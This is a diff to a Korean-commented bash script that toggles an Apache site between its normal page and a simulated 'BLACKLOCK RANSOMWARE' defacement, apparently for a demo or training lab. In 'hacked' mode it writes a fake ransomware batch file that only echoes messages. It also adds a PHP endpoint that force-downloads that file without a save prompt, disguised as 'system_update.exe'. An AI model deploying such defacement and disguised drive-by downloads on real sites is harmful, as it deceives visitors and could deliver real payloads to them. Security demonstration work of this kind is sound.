@@ -1,14 +1,14 @@
 #!/bin/bash
 ###############################################################################
-# 완전히 숨겨진 다운로드 (경로 절대 안물어봄)
-# PHP로 강제 다운로드
+# 토글 스크립트
+# 정상 ↔ 해킹 (완전 자동 다운로드)
 ###############################################################################
 
 WWW="/var/www/html/www"
 BACKUP="/tmp/index_REAL.php"
 
 echo "╔═══════════════════════════════════════════════╗"
-echo "║   완전 자동 다운로드 (경로 안물어봄)         ║"
+echo "║   사이트 상태 토글 (정상 ↔ 해킹)             ║"
 echo "╚═══════════════════════════════════════════════╝"
 echo ""
 
@@ -31,12 +31,51 @@ fi
 echo "✅ 대상 서버: $TARGET_SERVER (자동 감지)"
 echo ""
 
-# 원본 백업
-[ ! -f "$BACKUP" ] && [ -f "$WWW/index.php" ] && cp "$WWW/index.php" "$BACKUP" && echo "✅ 원본 백업"
+# 현재 상태 확인 (BLACKLOCK RANSOMWARE로 체크)
+if grep -q "BLACKLOCK RANSOMWARE" "$WWW/index.php" 2>/dev/null; then
+    # 해킹 → 정상
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "현재 상태: 해킹 사이트"
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+    echo "🔄 정상 사이트로 복구 중..."
+    echo ""
 
-# 1. 악성코드 생성
-mkdir -p $WWW/downloads
-cat > $WWW/downloads/malware.bat << 'EOF'
+    if [ -f "$BACKUP" ]; then
+        cp "$BACKUP" "$WWW/index.php"
+        rm -f "$WWW/dl.php"
+        rm -rf "$WWW/downloads"
+        chown apache:apache "$WWW/index.php"
+        chmod 644 "$WWW/index.php"
+        systemctl restart httpd
+
+        echo "✅ 정상 사이트 복구 완료!"
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "접속: http://$TARGET_SERVER"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    else
+        echo "❌ 백업 파일 없음: $BACKUP"
+        echo "   원본 사이트를 복구할 수 없습니다."
+    fi
+else
+    # 정상 → 해킹
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "현재 상태: 정상 사이트"
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+    echo "🔄 해킹 사이트로 전환 중..."
+    echo ""
+
+    # 원본 백업
+    if [ ! -f "$BACKUP" ]; then
+        cp "$WWW/index.php" "$BACKUP"
+        echo "✅ 원본 백업: $BACKUP"
+    fi
+
+    # 1. 악성코드 생성
+    mkdir -p $WWW/downloads
+    cat > $WWW/downloads/malware.bat << 'EOF'
 @echo off
 title RANSOMWARE ATTACK
 color 0C
@@ -53,32 +92,25 @@ echo [+] Data Exfil: IN PROGRESS
 echo.
 pause
 EOF
+    chmod 644 $WWW/downloads/malware.bat
+    chown apache:apache $WWW/downloads/malware.bat
+    echo "✅ 악성코드 생성"
 
-chmod 644 $WWW/downloads/malware.bat
-chown apache:apache $WWW/downloads/malware.bat
-
-# 2. PHP 다운로드 스크립트 (강제 다운로드)
-cat > $WWW/dl.php << 'EOFPHP'
+    # 2. PHP 강제 다운로드 스크립트
+    cat > $WWW/dl.php << 'EOFPHP'
 <?php
-// 완전히 숨겨진 강제 다운로드 (경로 안물어봄)
+// 강제 다운로드 (경로 안물어봄)
 $file = __DIR__ . '/downloads/malware.bat';
 
 if (file_exists($file)) {
-    // 캐시 방지
     header('Cache-Control: no-cache, must-revalidate');
     header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
-
-    // 강제 다운로드 헤더
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="system_update.exe"');
     header('Content-Length: ' . filesize($file));
     header('Content-Transfer-Encoding: binary');
-
-    // 출력 버퍼 클리어
     ob_clean();
     flush();
-
-    // 파일 전송
     readfile($file);
     exit;
 } else {
@@ -87,13 +119,12 @@ if (file_exists($file)) {
 }
 ?>
 EOFPHP
+    chmod 644 $WWW/dl.php
+    chown apache:apache $WWW/dl.php
+    echo "✅ 강제 다운로드 PHP 생성"
 
-chmod 644 $WWW/dl.php
-chown apache:apache $WWW/dl.php
-echo "✅ 강제 다운로드 PHP 생성"
-
-# 3. 해킹 페이지 생성
-cat > $WWW/index.php << 'EOFHTML'
+    # 3. 해킹 페이지
+    cat > $WWW/index.php << 'EOFHTML'
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -469,21 +500,20 @@ cat > $WWW/index.php << 'EOFHTML'
 </html>
 EOFHTML
 
-chmod 644 $WWW/index.php
-chown apache:apache $WWW/index.php
-echo "✅ 해킹 페이지 생성"
+    chmod 644 $WWW/index.php
+    chown apache:apache $WWW/index.php
+    systemctl restart httpd
 
-# Apache 재시작
-systemctl restart httpd
+    echo "✅ 해킹 사이트로 전환 완료!"
+    echo ""
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "접속: http://$TARGET_SERVER"
+    echo "→ 2초 후 자동 다운로드"
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+fi
 
 echo ""
-echo "╔═══════════════════════════════════════════════╗"
-echo "║   ✅ 완료!                                    ║"
-echo "╚═══════════════════════════════════════════════╝"
-echo ""
-echo "http://$TARGET_SERVER 접속"
-echo "→ 2초 후 자동 다운로드 (경로 절대 안물어봄!)"
-echo "→ 브라우저 기본 다운로드 폴더에 system_update.exe 생성"
-echo ""
-echo "복구: sudo cp $BACKUP $WWW/index.php && sudo systemctl restart httpd"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "다시 토글: sudo bash TOGGLE_SITE.sh"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
